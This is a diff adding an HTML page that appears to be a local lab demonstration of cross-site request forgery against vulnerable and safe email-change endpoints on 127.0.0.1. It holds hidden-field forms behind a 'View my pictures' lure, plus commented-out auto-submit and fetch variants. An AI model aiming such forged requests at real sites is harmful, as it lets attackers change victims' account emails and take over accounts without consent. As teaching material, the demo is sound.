@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+    <p>CAT</p>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <form action="http://127.0.0.1:8000/profile/change-email-vulnerable" method="post" enctype='application/json'>
+
+        <input type="hidden" name="email" value="newEmail"/>
+        <input type="submit" value="View my pictures - Vulnerable"/>
+        
+    </form>
+
+    <form action="http://127.0.0.1:8000/profile/change-email-safe" method="post" enctype='application/json'>
+
+        <input type="hidden" name="email" value="newEmail"/>
+        <input type="submit" value="View my pictures - Safe"/>
+        
+    </form>
+</head>
+<body>
+    <!-- <body onload="document.forms[0].submit()"> -->
+
+    <script>
+        // client will ask server for cors preflight in fetch()
+        // (function() {
+        //     const headers = new Headers();
+        //     headers.append("Content-Type", "application/json");
+        //     headers.append("origin","test.com")
+
+        //     fetch("http://127.0.0.1:8000/profile/change-email-vulnerable", {
+        //         method:"POST",
+        //         body:JSON.stringify({"id":"1", "email":"newEmail"}),
+        //         headers: headers
+        //     })
+        // })()
+    </script>
+</body>
+</html>
